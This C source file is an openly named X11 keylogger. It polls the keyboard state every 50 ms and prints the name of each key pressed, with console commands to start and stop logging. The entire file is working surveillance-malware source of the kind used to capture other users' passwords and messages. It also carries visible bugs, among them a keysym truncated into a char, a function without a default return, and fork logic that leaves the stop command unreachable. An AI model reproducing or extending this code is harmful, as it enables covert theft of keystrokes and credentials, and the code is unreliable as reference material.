#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>

#include <X11/XKBlib.h>
#include <X11/Xlib.h>

int is_keylogger_running = 0;
int should_keylogger_stop = 0;

int bit(unsigned char i)
{
	switch (i)
	{
		case 1: return 0;
		case 2: return 1;
		case 4: return 2;
		case 8: return 3;
		case 16: return 4;
		case 32: return 5;
		case 64: return 6;
		case 128: return 7;
	}
}

void keylogger()
{
	unsigned char keymap[32];
	unsigned char old_keymap[32];

	Display* display = XOpenDisplay(NULL);
	if (display == NULL) return;

	is_keylogger_running = 1;

	XQueryKeymap(display, keymap);
	while(should_keylogger_stop != 1) {
		usleep(50 * 1000); // 50ms
		memcpy(old_keymap, keymap, 32);
		XQueryKeymap(display, keymap);
		for (int i = 0; i != 32; ++i) {
			if (old_keymap[i] != keymap[i]) {
				int keycode = 8*i + bit(old_keymap[i] ^ keymap[i]);
				char keysym = XkbKeycodeToKeysym(display, keycode, 0, 0);
				char *keyname = XKeysymToString(keysym);
				if (keyname) printf("%s\n", keyname);
			}
		}
	}

	XCloseDisplay(display);
	is_keylogger_running = 0;
	should_keylogger_stop = 0;
}

int main() {
	while (1) {
		char ch;
		scanf("%c", &ch);
		if (ch == 's' && is_keylogger_running == 0){
			int pid = fork();
			if (pid != 0) keylogger();
		}
		else if (ch == 'q' && is_keylogger_running == 1)
			should_keylogger_stop = 1;
		else if (ch == 'g')
			printf("Imprimir keylog\n");
	}
}

